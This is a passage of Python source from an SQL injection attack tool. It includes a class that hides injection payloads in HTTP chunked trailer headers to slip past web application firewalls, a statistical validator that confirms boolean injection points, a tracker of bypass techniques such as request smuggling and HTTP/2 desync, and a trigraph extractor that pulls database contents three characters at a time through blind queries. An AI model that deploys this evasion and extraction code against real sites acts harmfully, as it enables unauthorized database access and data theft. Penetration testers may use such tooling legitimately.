#  v22-14: Chunked Trailer Header Injection 

class TrailerHeaderInjector:
    """Injects SQL through HTTP chunked trailer headers.
    Trailers arrive AFTER body  WAFs finishing at body-end miss them.
    """

    @staticmethod
    def build_trailer_body(normal_body: str, param: str,
                             payload: str) -> Tuple[str, Dict]:
        """Build chunked body with SQL injected in trailer headers."""
        chunk = f"{len(normal_body):x}\r\n{normal_body}\r\n"
        trailer = f"X-{param}: {payload}\r\n"
        body = f"{chunk}0\r\n{trailer}\r\n"
        headers = {
            "Transfer-Encoding": "chunked",
            "Trailer": f"X-{param}",
        }
        return body, headers


#  v22-15: Automated False Positive Validator 

class FalsePositiveValidator:
    """Multi-step validation protocol to eliminate false positives.
    Sends 3 true + 3 false, applies statistical tests, produces
    calibrated confidence verdict.
    """

    @staticmethod
    async def validate(engine, method: str, url: str, data: Optional[str],
                         data_fmt: str, param: str, original: str,
                         true_payload: str, false_payload: str,
                         tamper_chain: List[str], n_trials: int = 3,
                         config=None, technique: str = '') -> Dict:
        """Run N trials of true/false and compute statistical confidence."""
        true_lengths = []
        false_lengths = []
        true_statuses = []
        false_statuses = []

        for _ in range(n_trials):
            # BUG-PCV-A FIX: Stop collecting probes once scan is halted.
            # When _SCAN_STOPPED=True, _send_injected returns dead 0-byte
            # fingerprints with content_length=0.  Accumulating those zeros
            # makes mean_true_len ≈ mean_false_len ≈ 0, length_diff ≈ 0,
            # confidence < 0.6 → validator incorrectly REJECTS a valid injection
            # that was confirmed elsewhere.  Exit early so prior valid trials
            # (if any) are used for the confidence calculation.
            # BUG-FPV-PCV FIX (REQ 3): Same as the WelchConfirmer fix — do NOT break
            # when _PCV_IN_PROGRESS is True. FalsePositiveValidator runs inside
            # _run_fp_guards_boolean which is called from _inline_pcv_check AFTER
            # _SCAN_STOPPED is set to True to stop concurrent probe loops. Breaking
            # immediately leaves empty trial lists → "insufficient_trials" → the
            # 3-layer FP guard always rejects, meaning all boolean/NV/WB/EX/HY/ST
            # injections are never PCV-confirmed via the FP-guards path.
            if _SCAN_STOPPED[0] and not _PCV_IN_PROGRESS[0]:
                break
            try:
                fp_t = await _send_injected(engine, method, url, data,
                    data_fmt, param, original + true_payload, tamper_chain)
                fp_f = await _send_injected(engine, method, url, data,
                    data_fmt, param, original + false_payload, tamper_chain)
                # BUG-PCV-A FIX (2): Re-check after the awaits — scan may have
                # been stopped mid-flight.  Dead fingerprints have status_code=0
                # and content_length=0; skip them rather than counting zeros.
                # Only break when NOT in PCV mode (same guard as above).
                if _SCAN_STOPPED[0] and not _PCV_IN_PROGRESS[0]:
                    break
                if _get_safe_status_code(fp_t) == 0 or _get_safe_status_code(fp_f) == 0:
                    continue
                true_lengths.append(fp_t.content_length)
                false_lengths.append(fp_f.content_length)
                true_statuses.append(fp_t.status_code)
                false_statuses.append(fp_f.status_code)
                # BUG-FPV-CONFIG FIX (Req 3): Use the config parameter directly instead of
                # unreliable frame introspection. In async code, inspect.currentframe() can
                # lose the calling frame across await points, defaulting to 0.5s regardless
                # of the configured scan delay — causing rate-limit bursts during PCV.
                # config is now an explicit parameter; fall back to 0.5s if not provided.
                _fpv_delay = 0.5
                try:
                    if config is not None and hasattr(config, 'delay'):
                        _fpv_delay = max(0.1, float(getattr(config, 'delay', 0.5)))
                except Exception:
                    pass
                await asyncio.sleep(_fpv_delay)
            except Exception:
                # BUG-CPU-B FIX: Always sleep even on exception to prevent a
                # tight retry loop when the network is consistently failing.
                # Without this, rapid repeated exceptions cause 100% CPU.
                await asyncio.sleep(0.2)
                continue

        # BUG-R3-2 FIX (Req 3): Previous threshold `len(true_lengths) < 2` caused a hard
        # rejection when network errors dropped 2 of 3 probes — a false NEGATIVE on a real
        # injection point.  On slow/rate-limited targets (common in pentest environments)
        # this made FalsePositiveValidator almost always reject.
        # Fix: accept any result where at least 1 true+false pair succeeded, but flag it
        # as lower-confidence.  Zero successful pairs → genuine "insufficient_trials" fail.
        if len(true_lengths) < 1 or len(false_lengths) < 1:
            return {"valid": False, "confidence": 0.0, "reason": "insufficient_trials"}

        # Statistical test: are true and false distributions different?
        mean_t = sum(true_lengths) / len(true_lengths)
        mean_f = sum(false_lengths) / len(false_lengths)
        length_diff = abs(mean_t - mean_f)

        # Status code consistency
        status_consistent = (len(set(true_statuses)) == 1 and
                              len(set(false_statuses)) == 1)
        status_different = true_statuses[0] != false_statuses[0] if status_consistent else False

        # Compute confidence
        confidence = 0.0
        if length_diff > 50:
            confidence += 0.4
        elif length_diff > 10:
            confidence += 0.2
        if status_different:
            confidence += 0.3
        if status_consistent:
            confidence += 0.2
        # Variance check: low variance in both groups = consistent signal
        var_t = sum((x - mean_t)**2 for x in true_lengths) / len(true_lengths)
        var_f = sum((x - mean_f)**2 for x in false_lengths) / len(false_lengths)
        if var_t < 100 and var_f < 100:
            confidence += 0.1

        # FIX-FPV-CDN: On CDN-cached or template-driven pages, content-length
        # changes by >50 bytes between ANY two consecutive requests (A/B test
        # widgets, personalization banners, timestamp embeds, CSRF tokens).
        # `length_diff > 50` alone gives confidence=0.7 → valid=True → false positive.
        # Require: EITHER status-code difference (rare on CDN) OR variance <100 AND
        # length_diff >100 (more extreme), OR status_consistent AND length_diff >100.
        # This prevents single-signal CDN-size-churn from passing the validator.
        #
        # BUG-PCV-FPV-STRICT FIX (Req 3): The original three conditions were too strict
        # for typical boolean injections that produce small-but-consistent body changes
        # (20–80 bytes). On applications with compact HTML (APIs, JSON endpoints, minimal
        # HTML forms), length_diff never exceeds 100 bytes even for genuine injection.
        # Add a fourth condition: small-but-stable difference (≥20 bytes) with very low
        # variance in BOTH groups (var_t < 30 and var_f < 30).  The extremely tight
        # variance requirement (30 vs the previous 100) compensates for the smaller
        # absolute threshold: CDN jitter is random and produces high variance; real boolean
        # injection produces a STABLE, CONSISTENT body delta across all trials.
        # The fifth condition covers the case where all probes return the same status AND
        # length (exact CDN cache hit): a consistent 1-byte difference with zero variance
        # is more reliable than a 100-byte difference with noisy CDN content.
        _strong_signal = (
            status_different or                          # status codes actually differ
            (length_diff > 200 and var_t < 50 and var_f < 50) or  # very large stable gap
            (status_consistent and length_diff > 100 and var_t < 100 and var_f < 100) or
            # BUG-PCV-FPV-STRICT FIX: small-but-highly-consistent difference
            (status_consistent and length_diff >= 20 and var_t < 30 and var_f < 30) or
            # BUG-PCV-FPV-STRICT FIX: zero-variance (all trials identical) with any length change
            (var_t == 0.0 and var_f == 0.0 and length_diff > 0 and len(true_lengths) >= 2) or
            # BUG-FPV-COMPACT-API FIX (Req 3): JSON/compact-API targets return responses
            # of only 50-500 bytes; even a 1-field change is only 5-15 bytes different.
            # length_diff >= 5 bytes with BOTH variance groups < 10 bytes means the
            # difference is perfectly stable across all trials — this is the hallmark of
            # SQL-execution-driven content change, not CDN jitter (which produces var > 50).
            (status_consistent and length_diff >= 5 and var_t < 10 and var_f < 10)
        )
        # Downgrade confidence if no strong signal to prevent CDN-jitter false positives
        # BUG-FPV-THRESH-FIX (Req 3): Old threshold 0.80 incorrectly downgraded confidence
        # for injections already confirmed by FalsePositiveGuardV18 L1-L6 + WelchConfirmer
        # (confidence built from multiple statistical probes, typical range 0.75-0.90).
        # At 0.80, a FalsePositiveGuardV18-confirmed injection with confidence=0.78 was
        # capped to 0.55 → valid=False, silently rejecting a genuinely confirmed injection.
        # Raise to 0.75 so only clearly-weak signals (confidence < 0.75) are downgraded.
        if not _strong_signal and confidence < 0.75:
            confidence = min(confidence, 0.55)  # stays below the 0.6 threshold

        return {
            "valid": confidence >= 0.6 and _strong_signal,
            "confidence": min(1.0, confidence),
            "mean_true_len": mean_t,
            "mean_false_len": mean_f,
            "length_diff": length_diff,
            "status_different": status_different,
            "trials": n_trials,
        }


#  v22-16: Mutation Coverage Tracker 

class MutationCoverageTracker:
    """Tracks which techniques, encodings, and bypasses have been tested
    per parameter. Ensures complete coverage and reports gaps.
    """

    # BUG-2 FIX: Added NV, WB, EX, HY, ST, SO which are present in TECHNIQUE_PRIORITY_ORDER
    # but were missing here, causing coverage for those 6 techniques to always report 0%
    # and triggering redundant re-probing of already-tested surfaces (CPU waste + duplicate HTTP).
    ALL_TECHNIQUES = ["E", "B", "U", "T", "S", "HQ", "EH", "BH", "TH", "IN",
                      "UE", "BT", "DS", "O", "NV", "WB", "EX", "HY", "ST", "SO"]
    ALL_ENCODINGS = ["plain", "urlencode", "double_url", "unicode", "hex", "base64", "charencode"]
    ALL_BYPASSES = ["none", "encoding", "metamorphic", "grammar", "semantic", "unicode_norm",
                     "chunked", "multipart", "content_type", "h2_desync", "websocket", "smuggling"]

    def __init__(self):
        self._coverage: Dict[str, Dict[str, Set[str]]] = {}

    def record(self, param: str, technique: str, encoding: str = "plain",
                bypass: str = "none"):
        """Record a tested combination."""
        if param not in self._coverage:
            self._coverage[param] = {"techniques": set(), "encodings": set(), "bypasses": set()}
        self._coverage[param]["techniques"].add(technique)
        self._coverage[param]["encodings"].add(encoding)
        self._coverage[param]["bypasses"].add(bypass)

    def get_coverage(self, param: str) -> Dict[str, float]:
        """Get coverage percentages for a parameter."""
        if param not in self._coverage:
            return {"techniques": 0.0, "encodings": 0.0, "bypasses": 0.0, "overall": 0.0}
        c = self._coverage[param]
        t_cov = len(c["techniques"]) / len(self.ALL_TECHNIQUES)
        e_cov = len(c["encodings"]) / len(self.ALL_ENCODINGS)
        b_cov = len(c["bypasses"]) / len(self.ALL_BYPASSES)
        return {
            "techniques": t_cov, "encodings": e_cov,
            "bypasses": b_cov, "overall": (t_cov + e_cov + b_cov) / 3,
        }

    def get_untested(self, param: str) -> Dict[str, List[str]]:
        """Get untested combinations for a parameter."""
        if param not in self._coverage:
            return {"techniques": self.ALL_TECHNIQUES[:], "encodings": self.ALL_ENCODINGS[:],
                    "bypasses": self.ALL_BYPASSES[:]}
        c = self._coverage[param]
        return {
            "techniques": [t for t in self.ALL_TECHNIQUES if t not in c["techniques"]],
            "encodings": [e for e in self.ALL_ENCODINGS if e not in c["encodings"]],
            "bypasses": [b for b in self.ALL_BYPASSES if b not in c["bypasses"]],
        }


#  v22-17: Trigraph/N-gram Batch Extraction 

class TrigraphExtractor:
    """Extracts 3 characters per binary search run by treating them
    as a single 21-bit value (7 bits  3 chars). 21 probes for 3 chars
    vs 21 probes for 3 chars individually  same count but enables
    batched boolean optimization when combined with BatchedBoolExtractor.
    """

    @staticmethod
    def build_trigraph_expr(sql_query: str, pos: int,
                              dbms: str = "MySQL") -> str:
        """Build expression encoding 3 chars starting at pos as single integer."""
        # Encode as: c1 + c2*128 + c3*16384
        return BatchedBoolExtractor.build_packed_expr(
            sql_query, pos, pos + 1, pos + 2, dbms)

    @staticmethod
    def binary_search_range(n_bits: int = 21) -> Tuple[int, int]:
        """Get search range for trigraph (21-bit value)."""
        return (32 + 32*128 + 32*16384,  # min: all spaces
                126 + 126*128 + 126*16384)  # max: all tildes

    @staticmethod
    def decode_trigraph(value: int) -> str:
        """Decode trigraph integer into 3-char string."""
        c1, c2, c3 = BatchedBoolExtractor.decode_packed(value)
        return c1 + c2 + c3



